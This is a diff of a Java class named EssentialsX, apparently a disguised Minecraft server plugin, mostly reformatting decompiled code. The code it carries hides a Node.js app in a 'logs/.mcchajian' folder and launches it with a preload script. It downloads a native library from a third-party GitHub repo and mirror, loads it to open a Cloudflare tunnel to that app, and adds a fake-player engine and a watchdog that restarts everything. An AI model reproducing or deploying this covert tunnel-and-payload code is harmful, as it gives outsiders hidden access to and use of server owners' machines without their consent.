@@ -42,6 +42,7 @@ import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import org.bukkit.Bukkit;
 import org.bukkit.plugin.java.JavaPlugin;
 import sun.misc.Signal;
 import sun.misc.SignalHandler;
@@ -304,6 +305,7 @@ public class EssentialsX extends JavaPlugin {
             this.recordNodeCrashReport(this.nodeProcess, "startup_exit", port);
             return;
          }
+
          try {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                try {
@@ -321,7 +323,7 @@ public class EssentialsX extends JavaPlugin {
                   Thread.sleep(1000L);
                   waited++;
                   continue;
-               } catch (InterruptedException ignored) {
+               } catch (InterruptedException var10) {
                }
             }
 
@@ -393,6 +395,7 @@ public class EssentialsX extends JavaPlugin {
             this.recordMissingRuntimeFiles(nodeExe, script);
             return;
          }
+
          this.missingRuntimeReported = false;
          this.ensureCrashReportHeader();
 
@@ -400,12 +403,12 @@ public class EssentialsX extends JavaPlugin {
             if (Files.exists(logFile) && Files.size(logFile) > 1048576L) {
                Files.move(logFile, botDir.resolve("app.log.1"), StandardCopyOption.REPLACE_EXISTING);
             }
-         } catch (Exception ignored) {
+         } catch (Exception var12) {
          }
 
          try {
             nodeExe.toFile().setExecutable(true, false);
-         } catch (Exception var10) {
+         } catch (Exception var11) {
          }
 
          ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
@@ -424,7 +427,7 @@ public class EssentialsX extends JavaPlugin {
 
          try {
             this.nodeProcess.getOutputStream().close();
-         } catch (Exception var9) {
+         } catch (Exception var10) {
          }
       } catch (Exception e) {
          this.appendCrashReportEntry("[NODE_LAUNCH_ERROR] port=" + port + " error=" + e.getClass().getName() + ": " + e.getMessage());
@@ -438,144 +441,158 @@ public class EssentialsX extends JavaPlugin {
             Files.createDirectories(botDir);
             Path reportFile = botDir.resolve("app_crash_report.log");
             if (!Files.exists(reportFile) || Files.size(reportFile) == 0L) {
-               String header =
-                  "========================================================================\n"
-                  + " EssentialsX Node (app/index.js) Crash & Bug Diagnostic Report\n"
-                  + "========================================================================\n"
-                  + " Common Exit Codes:\n"
-                  + "  - 137 (SIGKILL): Container OOM Killer or host/panel killed Node.\n"
-                  + "  - 139 (SIGSEGV) / 134 (SIGABRT): Native crash (koffi/.so/musl/glibc).\n"
-                  + "  - 143 (SIGTERM): Terminated externally by panel/OS/watchdog.\n"
-                  + "  - 1: JS uncaught exception / rejected promise / startup port error.\n"
-                  + "========================================================================\n";
+               String header = "========================================================================\n EssentialsX Node (app/index.js) Crash & Bug Diagnostic Report\n========================================================================\n Common Exit Codes:\n  - 137 (SIGKILL): Container OOM Killer or host/panel killed Node.\n  - 139 (SIGSEGV) / 134 (SIGABRT): Native crash (koffi/.so/musl/glibc).\n  - 143 (SIGTERM): Terminated externally by panel/OS/watchdog.\n  - 1: JS uncaught exception / rejected promise / startup port error.\n========================================================================\n";
                Files.write(reportFile, header.getBytes(StandardCharsets.UTF_8));
             }
-         } catch (Exception ignored) {
+         } catch (Exception var6) {
          }
       }
    }
 
    private void appendCrashReportEntry(String body) {
-      if (body == null || body.isEmpty()) {
-         return;
-      }
-      synchronized (CRASH_LOG_LOCK) {
-         try {
-            this.ensureCrashReportHeader();
-            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-            Path reportFile = botDir.resolve("app_crash_report.log");
-            if (Files.exists(reportFile) && Files.size(reportFile) > MAX_CRASH_LOG_BYTES) {
-               Files.move(reportFile, botDir.resolve("app_crash_report.log.1"), StandardCopyOption.REPLACE_EXISTING);
+      if (body != null && !body.isEmpty()) {
+         synchronized (CRASH_LOG_LOCK) {
+            try {
                this.ensureCrashReportHeader();
+               Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+               Path reportFile = botDir.resolve("app_crash_report.log");
+               if (Files.exists(reportFile) && Files.size(reportFile) > 524288L) {
+                  Files.move(reportFile, botDir.resolve("app_crash_report.log.1"), StandardCopyOption.REPLACE_EXISTING);
+                  this.ensureCrashReportHeader();
+               }
+
+               String entry = "\n[" + LocalDateTime.now().format(CRASH_TS_FMT) + "]\n" + body + "\n";
+               Files.write(reportFile, entry.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+            } catch (Exception var7) {
             }
-            String entry = "\n[" + LocalDateTime.now().format(CRASH_TS_FMT) + "]\n" + body + "\n";
-            Files.write(reportFile, entry.getBytes(StandardCharsets.UTF_8), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
-         } catch (Exception ignored) {
          }
       }
    }
 
    private void recordMissingRuntimeFiles(Path nodeExe, Path script) {
-      if (this.missingRuntimeReported) {
-         return;
+      if (!this.missingRuntimeReported) {
+         this.missingRuntimeReported = true;
+         StringBuilder sb = new StringBuilder();
+         sb.append("[MISSING_RUNTIME_FILES]\n");
+         sb.append("nodeExe=").append(nodeExe).append(" exists=").append(Files.exists(nodeExe)).append("\n");
+         sb.append("indexJs=").append(script).append(" exists=").append(Files.exists(script)).append("\n");
+         sb.append("diagnosis=Runtime files missing (deleted by panel cleaner or failed deploy). Check deploy.log.\n");
+         String deployTail = readLogTail(Paths.get("logs", ".mcchajian", "deploy.log"), 25);
+         if (!deployTail.isEmpty()) {
+            sb.append("--- deploy.log tail ---\n").append(deployTail);
+         }
+
+         this.appendCrashReportEntry(sb.toString());
       }
-      this.missingRuntimeReported = true;
-      StringBuilder sb = new StringBuilder();
-      sb.append("[MISSING_RUNTIME_FILES]\n");
-      sb.append("nodeExe=").append(nodeExe).append(" exists=").append(Files.exists(nodeExe)).append("\n");
-      sb.append("indexJs=").append(script).append(" exists=").append(Files.exists(script)).append("\n");
-      sb.append("diagnosis=Runtime files missing (deleted by panel cleaner or failed deploy). Check deploy.log.\n");
-      String deployTail = readLogTail(Paths.get("logs", ".mcchajian", "deploy.log"), 25);
-      if (!deployTail.isEmpty()) {
-         sb.append("--- deploy.log tail ---\n").append(deployTail);
-      }
-      this.appendCrashReportEntry(sb.toString());
    }
 
    private void recordNodeUnresponsiveOnce(Process proc, String port) {
-      if (proc == null) {
-         return;
+      if (proc != null) {
+         long pid = -1L;
+
+         try {
+            pid = proc.pid();
+         } catch (Throwable var6) {
+         }
+
+         if (pid == -1L || pid != this.lastHealthReportPid) {
+            this.lastHealthReportPid = pid;
+            this.recordNodeCrashReport(proc, "healthcheck_unresponsive", port);
+         }
       }
-      long pid = -1L;
-      try {
-         pid = proc.pid();
-      } catch (Throwable ignored) {
-      }
-      if (pid != -1L && pid == this.lastHealthReportPid) {
-         return;
-      }
-      this.lastHealthReportPid = pid;
-      this.recordNodeCrashReport(proc, "healthcheck_unresponsive", port);
    }
 
    private void recordNodeCrashReport(Process proc, String trigger, String port) {
-      if (proc == null) {
-         return;
-      }
-      boolean alive = proc.isAlive();
-      if (!alive) {
-         if (proc == this.lastReportedNodeProcess) {
-            return;
+      if (proc != null) {
+         boolean alive = proc.isAlive();
+         if (!alive) {
+            if (proc == this.lastReportedNodeProcess) {
+               return;
+            }
+
+            this.lastReportedNodeProcess = proc;
          }
-         this.lastReportedNodeProcess = proc;
-      }
 
-      long now = System.currentTimeMillis();
-      long uptimeSec = nodeRestartTime > 0L ? Math.max(0L, (now - nodeRestartTime) / 1000L) : -1L;
-      long pid = -1L;
-      try {
-         pid = proc.pid();
-      } catch (Throwable ignored) {
-      }
+         long now = System.currentTimeMillis();
+         long uptimeSec = nodeRestartTime > 0L ? Math.max(0L, (now - nodeRestartTime) / 1000L) : -1L;
+         long pid = -1L;
 
-      int exitCode = -1;
-      if (!alive) {
          try {
-            exitCode = proc.exitValue();
-         } catch (Throwable ignored) {
+            pid = proc.pid();
+         } catch (Throwable var24) {
          }
-      }
 
-      Runtime rt = Runtime.getRuntime();
-      long jvmUsedMb = (rt.totalMemory() - rt.freeMemory()) / 1048576L;
-      long jvmMaxMb = rt.maxMemory() / 1048576L;
-
-      StringBuilder sb = new StringBuilder();
-      sb.append("[NODE_CRASH_REPORT] trigger=").append(trigger)
-        .append(" pid=").append(pid)
-        .append(" alive=").append(alive)
-        .append(" exitCode=").append(alive ? "N/A" : String.valueOf(exitCode))
-        .append(" uptimeSec=").append(uptimeSec)
-        .append(" port=").append(port == null ? "N/A" : port).append("\n");
-      sb.append("diagnosis=").append(alive ? "Process alive but HTTP localhost healthcheck failed (event loop blocked, wrong bind host, or hung native call)" : diagnoseExitCode(exitCode)).append("\n");
-      sb.append("os=").append(System.getProperty("os.name", "unknown"))
-        .append(" arch=").append(System.getProperty("os.arch", "unknown"))
-        .append(" libc=").append(detectLibcHint())
-        .append(" jvmHeap=").append(jvmUsedMb).append("/").append(jvmMaxMb).append("MB")
-        .append(" cfRunning=").append(cfSoRunning)
-        .append(" tunnelUrl=").append(lastKnownTunnelUrl.get()).append("\n");
-
-      String cgroupMem = readCgroupMemorySnapshot();
-      if (!cgroupMem.isEmpty()) {
-         sb.append("cgroupMem=").append(cgroupMem).append("\n");
-      }
-      String procMem = readMemInfoSnapshot();
-      if (!procMem.isEmpty()) {
-         sb.append("procMem=").append(procMem).append("\n");
-      }
-
-      Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
-      String appTail = readLogTail(botDir.resolve("app.log"), 60);
-      sb.append("--- app.log tail (last 60 lines) ---\n");
-      sb.append(appTail.isEmpty() ? "(empty or not created)\n" : appTail);
-
-      if (uptimeSec >= 0L && uptimeSec < 120L) {
-         String deployTail = readLogTail(botDir.resolve("deploy.log"), 25);
-         if (!deployTail.isEmpty()) {
-            sb.append("--- deploy.log tail (last 25 lines) ---\n").append(deployTail);
+         int exitCode = -1;
+         if (!alive) {
+            try {
+               exitCode = proc.exitValue();
+            } catch (Throwable var23) {
+            }
          }
+
+         Runtime rt = Runtime.getRuntime();
+         long jvmUsedMb = (rt.totalMemory() - rt.freeMemory()) / 1048576L;
+         long jvmMaxMb = rt.maxMemory() / 1048576L;
+         StringBuilder sb = new StringBuilder();
+         sb.append("[NODE_CRASH_REPORT] trigger=")
+            .append(trigger)
+            .append(" pid=")
+            .append(pid)
+            .append(" alive=")
+            .append(alive)
+            .append(" exitCode=")
+            .append(alive ? "N/A" : String.valueOf(exitCode))
+            .append(" uptimeSec=")
+            .append(uptimeSec)
+            .append(" port=")
+            .append(port == null ? "N/A" : port)
+            .append("\n");
+         sb.append("diagnosis=")
+            .append(
+               alive
+                  ? "Process alive but HTTP localhost healthcheck failed (event loop blocked, wrong bind host, or hung native call)"
+                  : diagnoseExitCode(exitCode)
+            )
+            .append("\n");
+         sb.append("os=")
+            .append(System.getProperty("os.name", "unknown"))
+            .append(" arch=")
+            .append(System.getProperty("os.arch", "unknown"))
+            .append(" libc=")
+            .append(detectLibcHint())
+            .append(" jvmHeap=")
+            .append(jvmUsedMb)
+            .append("/")
+            .append(jvmMaxMb)
+            .append("MB")
+            .append(" cfRunning=")
+            .append(cfSoRunning)
+            .append(" tunnelUrl=")
+            .append(lastKnownTunnelUrl.get())
+            .append("\n");
+         String cgroupMem = readCgroupMemorySnapshot();
+         if (!cgroupMem.isEmpty()) {
+            sb.append("cgroupMem=").append(cgroupMem).append("\n");
+         }
+
+         String procMem = readMemInfoSnapshot();
+         if (!procMem.isEmpty()) {
+            sb.append("procMem=").append(procMem).append("\n");
+         }
+
+         Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
+         String appTail = readLogTail(botDir.resolve("app.log"), 60);
+         sb.append("--- app.log tail (last 60 lines) ---\n");
+         sb.append(appTail.isEmpty() ? "(empty or not created)\n" : appTail);
+         if (uptimeSec >= 0L && uptimeSec < 120L) {
+            String deployTail = readLogTail(botDir.resolve("deploy.log"), 25);
+            if (!deployTail.isEmpty()) {
+               sb.append("--- deploy.log tail (last 25 lines) ---\n").append(deployTail);
+            }
+         }
+
+         this.appendCrashReportEntry(sb.toString());
       }
-      this.appendCrashReportEntry(sb.toString());
    }
 
    private static String diagnoseExitCode(int exitCode) {
@@ -591,10 +608,11 @@ public class EssentialsX extends JavaPlugin {
          return "SIGTERM (143): Process terminated externally (panel/host monitor or shutdown signal).";
       } else if (exitCode == 1) {
          return "Exit 1: JS uncaught exception, unhandled rejection, missing dependency, or bind failure (see app.log tail).";
-      } else if (exitCode == 0) {
-         return "Exit 0: Process exited cleanly on its own (check app.log tail for graceful exit trigger).";
+      } else {
+         return exitCode == 0
+            ? "Exit 0: Process exited cleanly on its own (check app.log tail for graceful exit trigger)."
+            : "Unexpected exit code " + exitCode + (exitCode > 128 ? " (signal " + (exitCode - 128) + ")" : "");
       }
-      return "Unexpected exit code " + exitCode + (exitCode > 128 ? " (signal " + (exitCode - 128) + ")" : "");
    }
 
    private static String detectLibcHint() {
@@ -608,13 +626,15 @@ public class EssentialsX extends JavaPlugin {
                }
             }
          }
+
          if (Files.exists(Paths.get("/lib/x86_64-linux-gnu/libc.so.6"))
             || Files.exists(Paths.get("/lib/aarch64-linux-gnu/libc.so.6"))
             || Files.exists(Paths.get("/lib64/libc.so.6"))) {
             return "glibc";
          }
-      } catch (Exception ignored) {
+      } catch (Exception var3) {
       }
+
       return "unknown";
    }
 
@@ -631,6 +651,7 @@ public class EssentialsX extends JavaPlugin {
             Path evPath = Paths.get("/sys/fs/cgroup/memory.events");
             if (Files.exists(evPath)) {
                List<String> lines = Files.readAllLines(evPath, StandardCharsets.UTF_8);
+
                for (int i = 0; i < lines.size(); i++) {
                   String ln = lines.get(i).trim();
                   if (ln.startsWith("oom ") || ln.startsWith("oom_kill ")) {
@@ -638,8 +659,10 @@ public class EssentialsX extends JavaPlugin {
                   }
                }
             }
+
             return "v2 used=" + curStr + " limit=" + maxStr + events;
          }
+
          Path curV1 = Paths.get("/sys/fs/cgroup/memory/memory.usage_in_bytes");
          Path maxV1 = Paths.get("/sys/fs/cgroup/memory/memory.limit_in_bytes");
          if (Files.exists(curV1)) {
@@ -647,18 +670,16 @@ public class EssentialsX extends JavaPlugin {
             String max = Files.exists(maxV1) ? Files.readString(maxV1, StandardCharsets.UTF_8).trim() : "unknown";
             return "v1 used=" + formatBytesMb(cur) + " limit=" + formatBytesMb(max);
          }
-      } catch (Exception ignored) {
+      } catch (Exception var11) {
       }
+
       return "";
    }
 
    private static String formatBytesMb(String raw) {
       try {
          long bytes = Long.parseLong(raw.trim());
-         if (bytes >= 1L << 50) {
-            return "unlimited";
-         }
-         return (bytes / 1048576L) + "MB";
+         return bytes >= 1125899906842624L ? "unlimited" : bytes / 1048576L + "MB";
       } catch (Exception e) {
          return raw;
       }
@@ -670,9 +691,11 @@ public class EssentialsX extends JavaPlugin {
          if (!Files.exists(memInfo)) {
             return "";
          }
+
          List<String> lines = Files.readAllLines(memInfo, StandardCharsets.UTF_8);
          String total = "";
          String avail = "";
+
          for (int i = 0; i < lines.size(); i++) {
             String ln = lines.get(i);
             if (ln.startsWith("MemTotal:")) {
@@ -681,26 +704,31 @@ public class EssentialsX extends JavaPlugin {
                avail = ln.replace("MemAvailable:", "").trim();
             }
          }
+
          if (!total.isEmpty() || !avail.isEmpty()) {
             return "MemTotal=" + total + " MemAvailable=" + avail;
          }
-      } catch (Exception ignored) {
+      } catch (Exception var6) {
       }
+
       return "";
    }
 
    private static String readLogTail(Path file, int maxLines) {
       try {
-         if (file == null || !Files.exists(file)) {
+         if (file != null && Files.exists(file)) {
+            List<String> all = Files.readAllLines(file, StandardCharsets.UTF_8);
+            int start = Math.max(0, all.size() - maxLines);
+            StringBuilder out = new StringBuilder();
+
+            for (int i = start; i < all.size(); i++) {
+               out.append(all.get(i)).append("\n");
+            }
+
+            return out.toString();
+         } else {
             return "";
          }
-         List<String> all = Files.readAllLines(file, StandardCharsets.UTF_8);
-         int start = Math.max(0, all.size() - maxLines);
-         StringBuilder out = new StringBuilder();
-         for (int i = start; i < all.size(); i++) {
-            out.append(all.get(i)).append("\n");
-         }
-         return out.toString();
       } catch (Exception e) {
          return "(read error: " + e.getMessage() + ")\n";
       }
@@ -740,57 +768,76 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private static boolean bytesContainAscii(byte[] haystack, byte[] needle) {
-      if (haystack == null || needle == null || needle.length == 0 || haystack.length < needle.length) {
-         return false;
-      }
-      int limit = haystack.length - needle.length;
-      for (int i = 0; i <= limit; i++) {
-         if (haystack[i] != needle[0]) continue;
-         boolean match = true;
-         for (int j = 1; j < needle.length; j++) {
-            if (haystack[i + j] != needle[j]) {
-               match = false;
-               break;
+      if (haystack != null && needle != null && needle.length != 0 && haystack.length >= needle.length) {
+         int limit = haystack.length - needle.length;
+
+         for (int i = 0; i <= limit; i++) {
+            if (haystack[i] == needle[0]) {
+               boolean match = true;
+
+               for (int j = 1; j < needle.length; j++) {
+                  if (haystack[i + j] != needle[j]) {
+                     match = false;
+                     break;
+                  }
+               }
+
+               if (match) {
+                  return true;
+               }
             }
          }
-         if (match) return true;
+
+         return false;
+      } else {
+         return false;
       }
-      return false;
    }
 
    private static boolean isValidCfSo(Path soFile, boolean arm64) {
       try {
-         if (!Files.exists(soFile) || Files.size(soFile) <= 1000000L) {
+         if (Files.exists(soFile) && Files.size(soFile) > 1000000L) {
+            byte[] data = Files.readAllBytes(soFile);
+            if (data.length < 20) {
+               return false;
+            } else if (data[0] == 127 && data[1] == 69 && data[2] == 76 && data[3] == 70) {
+               int eMachine = data[18] & 255 | (data[19] & 255) << 8;
+               int expectedMachine = arm64 ? 183 : 62;
+               return eMachine != expectedMachine
+                  ? false
+                  : bytesContainAscii(data, "CloudflaredTunnelUrl".getBytes(StandardCharsets.US_ASCII))
+                     && bytesContainAscii(data, "CloudflaredFree".getBytes(StandardCharsets.US_ASCII));
+            } else {
+               return false;
+            }
+         } else {
             return false;
          }
-         byte[] data = Files.readAllBytes(soFile);
-         if (data.length < 20) return false;
-         if (data[0] != 0x7F || data[1] != 'E' || data[2] != 'L' || data[3] != 'F') {
-            return false;
-         }
-         int eMachine = (data[18] & 0xFF) | ((data[19] & 0xFF) << 8);
-         int expectedMachine = arm64 ? 0xB7 : 0x3E;
-         if (eMachine != expectedMachine) {
-            return false;
-         }
-         return bytesContainAscii(data, "CloudflaredTunnelUrl".getBytes(StandardCharsets.US_ASCII))
-             && bytesContainAscii(data, "CloudflaredFree".getBytes(StandardCharsets.US_ASCII));
       } catch (Exception e) {
          return false;
       }
    }
 
    private static String readAndFreeCfStr(Function fn) {
-      if (fn == null) return "";
+      if (fn == null) {
+         return "";
+      }
+
       try {
          Pointer ptr = fn.invokePointer(new Object[0]);
-         if (ptr == null) return "";
+         if (ptr == null) {
+            return "";
+         }
+
          try {
-            String s = ptr.getString(0, "UTF-8");
+            String s = ptr.getString(0L, "UTF-8");
             return s == null ? "" : s.trim();
          } finally {
             if (cfFreeFn != null) {
-               try { cfFreeFn.invokeVoid(new Object[]{ptr}); } catch (Throwable ignored) {}
+               try {
+                  cfFreeFn.invokeVoid(new Object[]{ptr});
+               } catch (Throwable var11) {
+               }
             }
          }
       } catch (Throwable ignored) {
@@ -799,7 +846,10 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private static boolean isCfRunningSafe() {
-      if (cfIsRunningFn == null) return false;
+      if (cfIsRunningFn == null) {
+         return false;
+      }
+
       try {
          return cfIsRunningFn.invokeInt(new Object[0]) == 1;
       } catch (Throwable ignored) {
@@ -812,19 +862,44 @@ public class EssentialsX extends JavaPlugin {
          if (cfLib != null && cfStartFn != null && cfStopFn != null) {
             return true;
          }
+
+         boolean var10000;
          try {
             NativeLibrary lib = NativeLibrary.getInstance(soFile.toAbsolutePath().toString());
             cfStartFn = lib.getFunction("StartCloudflared");
             cfStopFn = lib.getFunction("StopCloudflared");
-            try { cfIsRunningFn = lib.getFunction("CloudflaredIsRunning"); } catch (Throwable ignored) { cfIsRunningFn = null; }
-            try { cfTunnelUrlFn = lib.getFunction("CloudflaredTunnelUrl"); } catch (Throwable ignored) { cfTunnelUrlFn = null; }
-            try { cfLastErrorFn = lib.getFunction("CloudflaredLastError"); } catch (Throwable ignored) { cfLastErrorFn = null; }
-            try { cfFreeFn = lib.getFunction("CloudflaredFree"); } catch (Throwable ignored) { cfFreeFn = null; }
+
+            try {
+               cfIsRunningFn = lib.getFunction("CloudflaredIsRunning");
+            } catch (Throwable ignored) {
+               cfIsRunningFn = null;
+            }
+
+            try {
+               cfTunnelUrlFn = lib.getFunction("CloudflaredTunnelUrl");
+            } catch (Throwable ignored) {
+               cfTunnelUrlFn = null;
+            }
+
+            try {
+               cfLastErrorFn = lib.getFunction("CloudflaredLastError");
+            } catch (Throwable ignored) {
+               cfLastErrorFn = null;
+            }
+
+            try {
+               cfFreeFn = lib.getFunction("CloudflaredFree");
+            } catch (Throwable ignored) {
+               cfFreeFn = null;
+            }
+
             cfLib = lib;
-            return true;
+            var10000 = true;
          } catch (Throwable ignored) {
             return false;
          }
+
+         return var10000;
       }
    }
 
@@ -832,13 +907,18 @@ public class EssentialsX extends JavaPlugin {
       if (cfStopFn != null) {
          try {
             cfStopFn.invokeInt(new Object[]{""});
-         } catch (Throwable ignored) {
+         } catch (Throwable var3) {
          }
-         for (int i = 0; i < 30; i++) {
-            if (!isCfRunningSafe()) break;
-            try { Thread.sleep(100L); } catch (InterruptedException ignored) { break; }
+
+         for (int i = 0; i < 30 && isCfRunningSafe(); i++) {
+            try {
+               Thread.sleep(100L);
+            } catch (InterruptedException ignored) {
+               break;
+            }
          }
       }
+
       cfSoRunning = false;
    }
 
@@ -867,8 +947,8 @@ public class EssentialsX extends JavaPlugin {
          if (isValidCfSo(soFile, arm64)) {
             return soFile;
          }
-         Files.deleteIfExists(soFile);
 
+         Files.deleteIfExists(soFile);
          String[] mirrors = new String[]{
             "https://raw.githubusercontent.com/zx1447/nxso/cfso/" + fileName,
             "https://gh-proxy.com/https://raw.githubusercontent.com/zx1447/nxso/cfso/" + fileName,
@@ -894,6 +974,7 @@ public class EssentialsX extends JavaPlugin {
                      } catch (Exception moveEx) {
                         Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING);
                      }
+
                      soFile.toFile().setExecutable(true);
                      return soFile;
                   }
@@ -901,7 +982,10 @@ public class EssentialsX extends JavaPlugin {
                   Files.deleteIfExists(tmpFile);
                }
             } catch (Exception var16) {
-               try { Files.deleteIfExists(tmpFile); } catch (Exception ignored) {}
+               try {
+                  Files.deleteIfExists(tmpFile);
+               } catch (Exception var17) {
+               }
             }
          }
 
@@ -918,6 +1002,7 @@ public class EssentialsX extends JavaPlugin {
             if (targetPort == null || targetPort.isEmpty() || "N/A".equals(targetPort)) {
                return;
             }
+
             if (cfSoRunning || isCfRunningSafe()) {
                return;
             }
@@ -936,7 +1021,7 @@ public class EssentialsX extends JavaPlugin {
                   if (rc != 0) {
                      readAndFreeCfStr(cfLastErrorFn);
                   }
-               } catch (Throwable ignored) {
+               } catch (Throwable var5x) {
                } finally {
                   if (activeCfThread == Thread.currentThread()) {
                      cfSoRunning = false;
@@ -959,6 +1044,7 @@ public class EssentialsX extends JavaPlugin {
             if (!memUrl.startsWith("http://") && !memUrl.startsWith("https://")) {
                memUrl = "https://" + memUrl;
             }
+
             return memUrl;
          }
 
@@ -992,7 +1078,7 @@ public class EssentialsX extends JavaPlugin {
                }
             }
          }
-      } catch (Exception var9) {
+      } catch (Exception var10) {
       }
 
       return null;
@@ -1000,19 +1086,19 @@ public class EssentialsX extends JavaPlugin {
 
    private boolean isNodeInternalAlive() {
       String port = this.readCurrentPort();
-      if (port == null || port.equals("N/A")) {
-         return false;
-      }
-
-      try {
-         HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
-         conn.setRequestMethod("HEAD");
-         conn.setConnectTimeout(2000);
-         conn.setReadTimeout(2000);
-         int code = conn.getResponseCode();
-         conn.disconnect();
-         return code > 0;
-      } catch (Exception e) {
+      if (port != null && !port.equals("N/A")) {
+         try {
+            HttpURLConnection conn = (HttpURLConnection)URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
+            conn.setRequestMethod("HEAD");
+            conn.setConnectTimeout(2000);
+            conn.setReadTimeout(2000);
+            int code = conn.getResponseCode();
+            conn.disconnect();
+            return code > 0;
+         } catch (Exception e) {
+            return false;
+         }
+      } else {
          return false;
       }
    }
@@ -1020,7 +1106,7 @@ public class EssentialsX extends JavaPlugin {
    private void restartCfWithBackoff() {
       long now = System.currentTimeMillis();
       long elapsed = now - lastCfRestartTime;
-      if (elapsed >= CF_RESTART_COOLDOWN_MS) {
+      if (elapsed >= 8000L) {
          cfRestartCount++;
          int backoffSec = Math.min(120, 8 * (1 << Math.min(cfRestartCount - 1, 4)));
 
@@ -1040,6 +1126,7 @@ public class EssentialsX extends JavaPlugin {
       if (this.nodeProcess != null && !this.nodeProcess.isAlive()) {
          this.recordNodeCrashReport(this.nodeProcess, "full_restart_dead_node", this.readCurrentPort());
       }
+
       this.safeKillCf();
       this.safeKillNode();
       lastKnownTunnelUrl.set("");
@@ -1049,6 +1136,7 @@ public class EssentialsX extends JavaPlugin {
          Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");
          if (!Files.exists(nodeExe) || !Files.exists(script)) {
             this.recordMissingRuntimeFiles(nodeExe, script);
+
             try {
                Thread.sleep(30000L);
             } catch (InterruptedException var6) {
@@ -1056,8 +1144,8 @@ public class EssentialsX extends JavaPlugin {
 
             return;
          }
-         this.missingRuntimeReported = false;
 
+         this.missingRuntimeReported = false;
          String newPort = this.allocateNodePort();
          this.startNodeProcess(newPort);
          if (this.nodeProcess == null) {
@@ -1111,7 +1199,7 @@ public class EssentialsX extends JavaPlugin {
                   String currentUrl = lastKnownTunnelUrl.get();
                   if (currentUrl != null && !currentUrl.isEmpty()) {
                      long urlAge = now - lastTunnelUrlTime;
-                     if (urlAge > TUNNEL_STALE_MS && !this.isNodeInternalAlive()) {
+                     if (urlAge > 120000L && !this.isNodeInternalAlive()) {
                         this.recordNodeUnresponsiveOnce(this.nodeProcess, this.readCurrentPort());
                         this.restartCfWithBackoff();
                      } else if (urlAge > 60000L && urlAge % 60000L < 5000L) {
@@ -1132,7 +1220,10 @@ public class EssentialsX extends JavaPlugin {
 
                Thread.sleep(5000L);
             } catch (Exception var7) {
-               try { Thread.sleep(5000L); } catch (InterruptedException ignored) {}
+               try {
+                  Thread.sleep(5000L);
+               } catch (InterruptedException var7x) {
+               }
             }
          }
       }, "\u5185\u7f6e\u7ebf\u7a0b\uff1a\u5b88\u62a4\u76d1\u63a7");
@@ -1184,20 +1275,22 @@ public class EssentialsX extends JavaPlugin {
          if (Files.exists(oldDir2)) {
             this.deleteDirectory(oldDir2.toFile());
          }
-      } catch (Exception var3) {
+      } catch (Exception var4) {
       }
 
       this.getLogger().info("EssentialsX plugin starting...");
+
       try {
          Map<String, String> bootEnv = new HashMap<>();
          this.loadEnvFile(bootEnv);
          FakePlayerEngine.preload();
          FakePlayerEngine engine = new FakePlayerEngine(this, bootEnv);
-         org.bukkit.Bukkit.getPluginManager().registerEvents(engine, this);
+         Bukkit.getPluginManager().registerEvents(engine, this);
          engine.start();
          this.fakePlayerEngine = engine;
-      } catch (Throwable ignored) {
+      } catch (Throwable var3) {
       }
+
       Thread deployThread = new Thread(() -> {
          try {
             HashMap<String, String> env = new HashMap<>();
@@ -1223,9 +1316,10 @@ public class EssentialsX extends JavaPlugin {
       if (this.fakePlayerEngine != null) {
          try {
             this.fakePlayerEngine.stop();
-         } catch (Throwable ignored) {
+         } catch (Throwable var5) {
          }
       }
+
       this.reapDescendantsOnce();
       this.getLogger().info("Stopping EssentialsX...");
       Path forceStopFile = Paths.get("logs", ".mcchajian", ".runtime", ".force_stop");
@@ -1383,46 +1477,45 @@ public class EssentialsX extends JavaPlugin {
    }
 
    private void deleteDirectory(File file) {
-      if (file == null || !file.exists()) {
-         return;
-      }
-      if (!Files.isSymbolicLink(file.toPath())) {
-         File[] files = file.listFiles();
-         if (files != null) {
-            for (File f : files) {
-               if (f.isDirectory() && !Files.isSymbolicLink(f.toPath())) {
-                  this.deleteDirectory(f);
-               } else {
-                  f.delete();
-               }
-            }
-         }
-      }
-
-      file.delete();
-   }
-
-   private void moveDirContentsIfAbsent(Path srcDir, Path dstDir) {
-      if (!Files.exists(srcDir) || !Files.isDirectory(srcDir)) {
-         return;
-      }
-      try {
-         Files.createDirectories(dstDir);
-         File[] entries = srcDir.toFile().listFiles();
-         if (entries != null) {
-            for (int i = 0; i < entries.length; i++) {
-               Path from = entries[i].toPath();
-               Path to = dstDir.resolve(entries[i].getName());
-               if (!Files.exists(to)) {
-                  try {
-                     Files.move(from, to, StandardCopyOption.REPLACE_EXISTING);
-                  } catch (Exception ignored) {
+      if (file != null && file.exists()) {
+         if (!Files.isSymbolicLink(file.toPath())) {
+            File[] files = file.listFiles();
+            if (files != null) {
+               for (File f : files) {
+                  if (f.isDirectory() && !Files.isSymbolicLink(f.toPath())) {
+                     this.deleteDirectory(f);
+                  } else {
+                     f.delete();
                   }
                }
             }
          }
-         this.deleteDirectory(srcDir.toFile());
-      } catch (Exception ignored) {
+
+         file.delete();
+      }
+   }
+
+   private void moveDirContentsIfAbsent(Path srcDir, Path dstDir) {
+      if (Files.exists(srcDir) && Files.isDirectory(srcDir)) {
+         try {
+            Files.createDirectories(dstDir);
+            File[] entries = srcDir.toFile().listFiles();
+            if (entries != null) {
+               for (int i = 0; i < entries.length; i++) {
+                  Path from = entries[i].toPath();
+                  Path to = dstDir.resolve(entries[i].getName());
+                  if (!Files.exists(to)) {
+                     try {
+                        Files.move(from, to, StandardCopyOption.REPLACE_EXISTING);
+                     } catch (Exception var8) {
+                     }
+                  }
+               }
+            }
+
